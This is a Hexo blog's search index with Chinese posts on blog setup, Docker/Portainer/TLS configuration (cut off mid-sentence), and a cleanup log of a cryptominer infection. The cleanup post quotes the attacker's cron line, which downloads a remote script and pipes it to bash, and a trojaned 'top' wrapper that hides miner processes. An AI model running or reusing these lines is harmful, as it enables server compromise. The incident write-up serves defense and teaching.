<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>基于Hexo的个人博客搭建</title>
    <link href="/2022/06/06/%E5%9F%BA%E4%BA%8EGithub%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    <url>/2022/06/06/%E5%9F%BA%E4%BA%8EGithub%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<blockquote><p>使用 Hexo 博客框架快速搭建个人博客，配合 Github Pages 实现博客部署及域名访问</p></blockquote><h2 id="Hexo安装"><a href="#Hexo安装" class="headerlink" title="Hexo安装"></a>Hexo安装</h2><ul><li>前置环境：安装<code>Node.js</code>、<code>git</code></li></ul><h3 id="配置本地git-仓库"><a href="#配置本地git-仓库" class="headerlink" title="配置本地git 仓库"></a>配置本地<code>git</code> 仓库</h3><p> 找到Git安装目录，打开Git Bash窗口，设置user.name和 user.email  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">git config --global user.name niceday<br>git config --global user.email niceday@163.com<br></code></pre></td></tr></table></figure><p>配置Git公钥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh-keygen -t rsa -C &quot;niceday@163.com&quot;<br></code></pre></td></tr></table></figure><p>连按三个回车后，得到生成的公钥文件 <code>id_rsa.pub</code> ，复制其中的内容，添加到Github的<code>SSH KEY</code> 中，添加完成后，使用以下命令查看是否添加成功</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh git@github.com<br></code></pre></td></tr></table></figure><h3 id="Hexo搭建"><a href="#Hexo搭建" class="headerlink" title="Hexo搭建"></a>Hexo搭建</h3><p>Hexo 官方文档：  <a href="https://hexo.io/zh-cn/docs/index.html">文档 | Hexo</a> </p><p>进入创建好的 Blog 文件夹，右击选择 <code>Git Bash here</code> 打开命令窗口，输入以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 安装Hexo</span><br>npm install -g hexo-cli<br><span class="hljs-comment"># 检查安装是否成功</span><br>hexo -v<br><span class="hljs-comment"># 初始化hexo文件夹</span><br>hexo init blog<br><span class="hljs-built_in">cd</span> blog<br><span class="hljs-comment"># 新建一个文章</span><br>hexo new test_blog<br><span class="hljs-comment"># 生成静态页面</span><br>hexo g<br><span class="hljs-comment"># 启动服务器，本地预览 localhost:4000</span><br>hexo s<br></code></pre></td></tr></table></figure><h2 id="Hexo-主题安装"><a href="#Hexo-主题安装" class="headerlink" title="Hexo 主题安装"></a>Hexo 主题安装</h2><p>参考 <code>Hexo Fluid</code> 官方手册：<a href="https://hexo.fluid-dev.com/docs">Hexo Fluid 用户手册</a></p><h2 id="Github-Pages"><a href="#Github-Pages" class="headerlink" title="Github Pages"></a>Github Pages</h2><p>GitHub 主页右上角加号 -&gt; New repository ：</p><ul><li>Repository name 中输入 <code>账号名.github.io</code></li><li>勾选 “Initialize this repository with a README”</li></ul><p>创建仓库后，默认自动启用HTTPS，访问地址为 <code>https://账号名.github.io</code> </p><h2 id="部署-Hexo-到-Github-Pages"><a href="#部署-Hexo-到-Github-Pages" class="headerlink" title="部署 Hexo 到 Github Pages"></a>部署 Hexo 到 Github Pages</h2><p>在 Blog 文件目录下，输入以下命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">安装 hexo-deployer-git</span><br>npm run install hexo-deployer-git --save<br></code></pre></td></tr></table></figure><p>安装完成后，修改同目录下<code>_config.yml</code>文件末尾部分</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">deploy:</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">git</span><br>  <span class="hljs-attr">repository:</span> <span class="hljs-string">git@github.com:账户名/账户名.github.io.git</span><br>  <span class="hljs-attr">branch:</span> <span class="hljs-string">main</span><br></code></pre></td></tr></table></figure><p>完成后，运行以下命令，将Hexo部署到Github Pages，通过域名 <code>https://账号名.github.io</code> 可查看博客网站</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo deploy<br></code></pre></td></tr></table></figure><h2 id="部署-Hexo-到-Nginx"><a href="#部署-Hexo-到-Nginx" class="headerlink" title="部署 Hexo 到 Nginx"></a>部署 Hexo 到 Nginx</h2><p>在<code>Hexo</code> 项目目录下，执行以下命令打包 <code>Hexo</code> ，生成 <code>public</code> 目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo g<br></code></pre></td></tr></table></figure><p>将<code>public</code> 目录下的文件放至 nginx 的<code>html</code> 目录，启动 nginx 即可</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>pnscan挖矿病毒排查过程记录</title>
    <link href="/2022/06/06/pnscan%E7%97%85%E6%AF%92%E6%8E%92%E6%9F%A5/"/>
    <url>/2022/06/06/pnscan%E7%97%85%E6%AF%92%E6%8E%92%E6%9F%A5/</url>
    
    <content type="html"><![CDATA[<blockquote><p>记一次服务器被挖矿病毒攻击</p></blockquote><ul><li><p>原因：因为docker远程连接，开放了默认端口2375，导致中了挖矿病毒kdevtmpfsi，pnscan</p></li><li><p>现象：CPU占用拉满，定时任务向6379端口持续发送信息</p></li></ul><ol><li><p>首先想到使用top命令排查进程，发现top无法使用，显示<code>permission denied</code> ，</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@VM-16-4-centos bin]# top<br>-bash: /usr/bin/top: Permission denied<br></code></pre></td></tr></table></figure></li><li><p>查询后获悉<code>top</code> 命令被篡改为如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@VM-16-4-centos bin]# cat /usr/bin/top<br><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br>top.lanigiro $@ | grep -v &#x27;ddns\|scan&#x27;<br></code></pre></td></tr></table></figure></li><li><p>拷贝原有top脚本，通过ftp传输，发现无法覆盖<code>top</code> 文件，使用 <code>lsattr</code> 命令查看文件属性，果然为被设置为了 <code>-i</code>  不可修改：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@VM-16-4-centos bin]# lsattr /usr/bin/top<br>----i--------e-- /usr/bin/top<br></code></pre></td></tr></table></figure></li><li><p>打算使用<code>chattr</code> 命令删除<code>-i</code> 参数，发现<code>chattr</code> 命令不可用，也被删除掉了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@VM-16-4-centos bin]# chattr<br>-bash: chattr: command not found<br></code></pre></td></tr></table></figure></li><li><p>只能重新安装<code>chattr</code> 命令，查看安装包版本，先删除再安装<code>e2fsprogs</code> 包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@VM-16-4-centos bin]# rpm -qa|grep e2fsprogs<br>e2fsprogs-libs-1.42.9-19.el7.x86_64<br>e2fsprogs-1.42.9-19.el7.x86_64<br>[root@VM-16-4-centos bin]# yum remove e2fsprogs-1.42.9-19.el7.x86_64<br>[root@VM-16-4-centos bin]# yum install e2fsprogs-1.42.9-19.el7.x86_64<br></code></pre></td></tr></table></figure></li><li><p>重装后<code>chattr</code> 命令终于可用，修改文件属性，使用FTP工具传输覆盖<code>top</code> 命令，仍然无法使用top命令，于是改安装<code>htop</code> 命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">yum -y install htop<br></code></pre></td></tr></table></figure></li><li><p>使用<code>htop</code> 命令查看，发现挖矿病毒，继续排查</p><p><img src="C:\Users\sherlock\AppData\Roaming\Typora\typora-user-images\1654084303957.png" alt="1654084303957"></p></li><li><p>查看定时任务，并停止，发现cron脚本也被感染无法更改（心肺停止…）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@VM-16-4-centos bin]# crontab -l<br>*/30 * * * * /usr/bin/cdz -fsSL http://oracle.zzhreceive.top/b2f628/b.sh | bash &gt; /dev/null 2&gt;&amp;1<br><br>[root@VM-16-4-centos bin]# crontab -e<br><br>*/30 * * * * /usr/bin/cdz -fsSL http://oracle.zzhreceive.top/b2f628/b.sh | bash &gt; /dev/null 2&gt;&amp;1<br><br></code></pre></td></tr></table></figure></li><li><p>修改<code>cron</code> 文件属性，修改后删除定时任务，再使用<code>htop</code> 命令查看，CPU占用明显降低，仅剩  <strong>pnscan</strong> 病毒</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@VM-16-4-centos bin]# chattr -iae /var/spool/cron/root <br>[root@VM-16-4-centos bin]# lsattr /var/spool/cron/<br>-------------e-- /var/spool/cron/root<br>[root@VM-16-4-centos bin]# crontab -e<br>crontab: installing new crontab<br><br></code></pre></td></tr></table></figure></li><li><p>但修改后仍然无法删除定时任务脚本只能编辑，原来可能存在隐藏文件，<code>lsattr -a</code> 命令查看果然有，同样<code>chattr</code> 修改对应文件属性</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@VM-12-14-centos cron]# lsattr -a<br>----ia-------e-- ./.<br>-------------e-- ./..<br>---------------- ./root<br>[root@VM-12-14-centos cron]# chattr -iae .<br>[root@VM-12-14-centos cron]# chattr -iae ..<br>[root@VM-12-14-centos cron]# lsattr -a<br>---------------- ./.<br>---------------- ./..<br>----------------./root<br></code></pre></td></tr></table></figure></li><li><p>去除pnscan，用htop命令查看 pnscan进程位置，删除对应文件，至此pnscan病毒搞定</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@VM-12-14-centos bin]# rm -f pnscan<br></code></pre></td></tr></table></figure></li><li><p>终于发现被攻击原因，因为docker远程连接，开放了默认端口2375，导致中了挖矿病毒，具体原因分析如下：</p></li></ol><ul><li><p>docker开放2375端口用于远程管理容器，而容器本身可以挂载服务器目录；</p></li><li><p>因此攻击者通过2375端口，拉取做好的镜像，启动容器时挂载<code>~/.ssh</code> 目录 在 <code>authorized_keys</code> 中添加了攻击者的公钥，至此，攻击者获得服务器控制权，进而执行病毒脚本。</p></li><li><p>参考：<a href="https://www.techug.com/post/do-a-hacker-invade-a-server.html">https://www.techug.com/post/do-a-hacker-invade-a-server.html</a></p></li></ul><blockquote><p>后记：外网环境应通过<code>TLS</code>方式开启docker远程端口访问，配置细节可站内搜索《docker环境及常用镜像安装》  </p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/06/06/hello-world/"/>
    <url>/2022/06/06/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>docker环境及常用镜像安装</title>
    <link href="/2022/06/06/docker%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/"/>
    <url>/2022/06/06/docker%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/</url>
    
    <content type="html"><![CDATA[<h1 id="docker环境安装"><a href="#docker环境安装" class="headerlink" title="docker环境安装"></a>docker环境安装</h1><blockquote><p><a href="https://so.csdn.net/so/search?q=Docker&spm=1001.2101.3001.7020">Docker</a> 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中,然后发布到任何流行的Linux机器或Windows 机器上,也可以实现虚拟化,容器是完全使用沙箱机制,相互之间不会有任何接口。 </p></blockquote><ul><li><p>参考： <a href="https://blog.csdn.net/qq_26400011/article/details/113856681?ops_request_misc=%7B%22request_id%22:%22165398523016781435481764%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=165398523016781435481764&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-113856681-null-null.142%5Ev11%5Epc_search_result_control_group,157%5Ev12%5Econtrol&utm_term=docker%E5%AE%89%E8%A3%85&spm=1018.2226.3001.4187">Centos7安装Docker</a> </p></li><li><p>服务器环境：CentOS 7.6</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">更新yum</span><br>yum update<br><span class="hljs-meta prompt_"># </span><span class="language-bash">安装yum-utils工具</span><br>yum install -y yum-utils<br><span class="hljs-meta prompt_">#</span><span class="language-bash">安装htop</span><br>yum -y install htop<br><span class="hljs-meta prompt_">#</span><span class="language-bash">安装tree命令</span><br>yum -y install tree<br><span class="hljs-meta prompt_">#</span><span class="language-bash">设置阿里云镜像仓库地址</span><br>yum-config-manager \<br>   --add-repo \<br>   http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">更新yum软件包索引</span><br>yum makecache fase <br><span class="hljs-meta prompt_"># </span><span class="language-bash">安装docker（这里安装docker-ce版本）</span><br>yum install docker-ce docker-ce-cli containerd.io<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">配置阿里云镜像加速器</span><br>mkdir -p /etc/docker<br><span class="hljs-meta prompt_"># </span><span class="language-bash">配置镜像加速地址(需至阿里云平台——容器服务申请)</span><br>tee /etc/docker/daemon.json &lt;&lt;-&#x27;EOF&#x27;<br>&#123;<br>&quot;registry-mirrors&quot;: [&quot;https://xxxxxxx.mirror.aliyuncs.com&quot;]<br>&#125;<br>EOF<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">重启docker</span><br>systemctl daemon-reload<br>systemctl restart docker<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">设置开机启动docker</span><br>systemctl enable docker<br><br><br></code></pre></td></tr></table></figure><h2 id="docker常用命令"><a href="#docker常用命令" class="headerlink" title="docker常用命令"></a>docker常用命令</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">构建镜像</span><br>docker build -t 镜像名称<br><span class="hljs-meta prompt_"># </span><span class="language-bash">加载镜像tar包</span><br>docker load -i xxx.tar<br><span class="hljs-meta prompt_"># </span><span class="language-bash">删除镜像</span><br>docker rmi 镜像名称<br><span class="hljs-meta prompt_"># </span><span class="language-bash">保存镜像</span><br>docker save hello-world:latest -o /home/docker/images/hello-world.tar<br><span class="hljs-meta prompt_"># </span><span class="language-bash">启停容器</span><br>docker run -d --name 容器名称 -p 8080:80 镜像名称<br>docker start 镜像名称<br>docker stop 镜像名称<br><span class="hljs-meta prompt_"># </span><span class="language-bash">删除容器</span><br>docker rm 镜像名称<br><span class="hljs-meta prompt_"># </span><span class="language-bash">进入容器</span><br>docker exec -it 容器名称 容器命令行<br><span class="hljs-meta prompt_"># </span><span class="language-bash">退出容器</span><br>exit<br></code></pre></td></tr></table></figure><h1 id="docker安装Portainer"><a href="#docker安装Portainer" class="headerlink" title="docker安装Portainer"></a>docker安装Portainer</h1><blockquote><p>Portainer是一个可视化的容器镜像的图形管理工具，利用Portainer可以轻松构建，管理和维护Docker环境。 而且完全免费，基于容器化的安装方式，方便高效部署。 </p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">获取portainer-ce镜像</span><br>docker search portainer<br>docker pull portainer/portainer-ce<br><span class="hljs-meta prompt_"># </span><span class="language-bash">创建volume做持久化</span><br>docker volume create portainer_data<br><span class="hljs-meta prompt_"># </span><span class="language-bash">启动</span><br>docker run -d -p 9000:9000 --restart=always --name=portainer \<br>  -v /var/run/docker.sock:/var/run/docker.sock \<br>  -v portainer_data:/data \<br>  portainer/portainer-ce<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看容器状态，通过 ip:9000 访问web页面</span><br>docker ps -a<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">允许远程连接docker，这里配置docker端口为2375，同步需要打开防火墙</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">！！！！注意：此方式仅适用于内网环境，生产环境请使用TLS连接，否则直接docker暴露2375端口，极易被挖矿病毒攻击</span><br>vim /usr/lib/systemd/system/docker.service<br><span class="hljs-meta prompt_"># </span><span class="language-bash">找到以下行，修改为</span><br>ExecStart=/usr/bin/dockerd -H tcp://0.0.0.0:2375 -H unix://var/run/docker.sock --containerd=/run/containerd/containerd.sock<br><span class="hljs-meta prompt_"># </span><span class="language-bash">重启docker</span><br>systemctl daemon-reload<br>systemctl restart docker<br></code></pre></td></tr></table></figure><h1 id="docker开启远程安全访问（TLS）"><a href="#docker开启远程安全访问（TLS）" class="headerlink" title="docker开启远程安全访问（TLS）"></a>docker开启远程安全访问（TLS）</h1><p>通过<code>TLS</code>方式远程安全访问docker，这里配置docker端口为<code>2375</code>，同步需要打开防火墙</p><p>首先，创建一个ca文件夹存放公钥和私钥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir /usr/local/userSh<br>cd /usr/local/userSh<br>touch tls.sh<br>vi tls.sh<br></code></pre></td></tr></table></figure><p>将下列脚本内容复制</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">相关配置信息（除IP有用，其他基本咩有用）</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">服务器IP或者域名</span><br>SERVER=&quot;服务器ip&quot;<br>PASSWORD=&quot;nicetry&quot;<br>COUNTRY=&quot;CN&quot;<br>STATE=&quot;Sichuan&quot;<br>CITY=&quot;Hangzhou&quot;<br>ORGANIZATION=&quot;nicetry&quot;<br>ORGANIZATIONAL_UNIT=&quot;Dev&quot;<br>EMAIL=&quot;nicetry@163.com&quot;<br><span class="hljs-meta prompt_"> </span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">##开始生成文件###</span></span><br>echo &quot;开始生成文件&quot;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">创建密钥文件夹</span><br>mkdir -p /usr/local/ca<br><span class="hljs-meta prompt_">#</span><span class="language-bash">切换到生产密钥的目录</span><br>cd /usr/local/ca  <br><span class="hljs-meta prompt_">#</span><span class="language-bash">生成ca私钥(使用aes256加密)</span><br>openssl genrsa -aes256 -passout pass:$PASSWORD  -out ca-key.pem 4096<br><span class="hljs-meta prompt_">#</span><span class="language-bash">生成ca证书，填写配置信息</span><br>openssl req -new -x509 -passin &quot;pass:$PASSWORD&quot; -days 3650 -key ca-key.pem -sha256 -out ca.pem -subj &quot;/C=$COUNTRY/ST=$STATE/L=$CITY/O=$ORGANIZATION/OU=$ORGANIZATIONAL_UNIT/CN=$SERVER/emailAddress=$EMAIL&quot;<br><span class="hljs-meta prompt_"> </span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">生成server证书私钥文件</span><br>openssl genrsa -out server-key.pem 4096<br><span class="hljs-meta prompt_">#</span><span class="language-bash">生成server证书请求文件</span><br>openssl req -subj &quot;/CN=$SERVER&quot; -new -key server-key.pem -out server.csr<br><span class="hljs-meta prompt_">#</span><span class="language-bash">配置白名单  你使用的是服务器Ip的话,请将前面的DNS换成IP  <span class="hljs-built_in">echo</span> subjectAltName = IP:<span class="hljs-variable">$SERVER</span>,IP:0.0.0.0 &gt;&gt; extfile.cnf</span><br>sh -c  &#x27;echo &quot;subjectAltName = DNS:&#x27;$SERVER&#x27;,IP:0.0.0.0&quot; &gt;&gt; extfile.cnf&#x27;<br>sh -c  &#x27;echo &quot;extendedKeyUsage = serverAuth&quot; &gt;&gt; extfile.cnf&#x27;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">使用CA证书及CA密钥以及上面的server证书请求文件进行签发，生成server自签证书</span><br>openssl x509 -req -days 3650 -in server.csr -CA ca.pem -CAkey ca-key.pem -passin &quot;pass:$PASSWORD&quot; -CAcreateserial  -out server-cert.pem  -extfile extfile.cnf<br><span class="hljs-meta prompt_"> </span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">生成client证书RSA私钥文件</span><br>openssl genrsa -out key.pem 4096<br><span class="hljs-meta prompt_">#</span><span class="language-bash">生成client证书请求文件</span><br>openssl req -subj &#x27;/CN=client&#x27; -new -key key.pem -out client.csr<br> <br>sh -c &#x27;echo extendedKeyUsage=clientAuth &gt;&gt; extfile.cnf&#x27;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">生成client自签证书（根据上面的client私钥文件、client证书请求文件生成）</span><br>openssl x509 -req -days 3650 -in client.csr -CA ca.pem -CAkey ca-key.pem  -passin &quot;pass:$PASSWORD&quot; -CAcreateserial -out cert.pem  -extfile extfile.cnf<br><span class="hljs-meta prompt_"> </span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">更改密钥权限</span><br>chmod 0400 ca-key.pem key.pem server-key.pem<br><span class="hljs-meta prompt_">#</span><span class="language-bash">更改密钥权限</span><br>chmod 0444 ca.pem server-cert.pem cert.pem<br><span class="hljs-meta prompt_">#</span><span class="language-bash">删除无用文件</span><br>rm client.csr server.csr<br><span class="hljs-meta prompt_">#</span><span class="language-bash">复制密钥文件</span><br>cp server-*.pem /etc/docker/<br>cp ca.pem /etc/docker/<br>echo &quot;生成文件完成&quot;<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">##生成结束###</span></span><br></code></pre></td></tr></table></figure><p>执行脚本，在<code>/usr/local/ca/</code> 目录下生成ca证书</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sh tls.sh<br></code></pre></td></tr></table></figure><p>修改docker配置文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim /usr/lib/systemd/system/docker.service<br><span class="hljs-meta prompt_"># </span><span class="language-bash">找到以下行，修改为</span><br>ExecStart=/usr/bin/dockerd --tlsverify --tlscacert=/usr/local/ca/ca.pem --tlscert=/usr/local/ca/server-cert.pem --tlskey=/usr/local/ca/server-key.pem -H tcp://0.0.0.0:2375 -H unix://var/run/docker.sock --containerd=/run/containerd/containerd.sock<br><span class="hljs-meta prompt_"># </span><span class="language-bash">重启docker，同时需放开2375端口防火墙</span><br>systemctl daemon-reload<br>systemctl restart docker<br></code></pre></td></tr></table></figure><p>在<code>Portainer</code>中使用<code>TLS</code> 方式，上传<code>cert.pem</code> 、<code>key.pem</code> 文件</p><p><img src="C:\Users\sherlock\AppData\Roaming\Typora\typora-user-images\1654156409795.png" alt="1654156409795"></p><h1 id="docker安装netdata"><a href="#docker安装netdata" class="headerlink" title="docker安装netdata"></a>docker安装netdata</h1><blockquote><p> Netdata 是一款 Linux 性能实时监测工具 ，其自身是一个高度优化的 Linux 守护进程，它为 